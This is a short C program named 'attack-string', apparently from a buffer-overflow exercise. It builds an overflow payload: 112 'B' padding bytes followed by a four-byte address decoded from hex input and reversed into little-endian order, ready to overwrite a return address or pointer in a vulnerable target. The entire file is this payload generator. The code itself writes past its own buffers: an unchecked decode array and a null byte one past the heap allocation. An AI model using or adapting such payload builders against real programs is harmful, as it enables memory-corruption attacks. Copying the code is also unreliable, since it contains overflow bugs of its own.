#include <stdio.h>
#include <string.h>
#include <stdlib.h> 

int main(int argc,char* argv[])
{
 	if (argc != 2) {
                printf("Input argument missing. \n ");
                printf("Format should be ");
                printf("./attack-string <X> \n");
                return -1;
        }else{
	int buffer_length = 100, memory_allocated = 116, buffer_text = 112, hexa_text = 116;
	const char* input_string = argv[1];
	int input_length = strlen(input_string);

	int hexad=0, buf=0;
	unsigned char *memory_allocted_buffer = malloc(memory_allocated);
	unsigned char hexadecimalvalue, hexadecimaltocharacter[buffer_length];

	while(input_string[0]!='\0'){
		sscanf(input_string,"%2hhx",&hexadecimalvalue);
		hexadecimaltocharacter[buf++] = hexadecimalvalue;
		input_string= input_string + 2;
	}

	hexadecimaltocharacter[buf] = '\0';
	int lenhexadecimaltocharacter = buf;
	
	buf=0;
	while(buf<buffer_text){
		memory_allocted_buffer[buf] = 'B';
		buf++;
	}

	hexad = lenhexadecimaltocharacter-1;
	
	for( ;buf<hexa_text; buf++){
		memory_allocted_buffer[buf] = hexadecimaltocharacter[hexad--];
	}

	memory_allocted_buffer[buf] = '\0';
	puts(memory_allocted_buffer);

	return 0;
	}
}
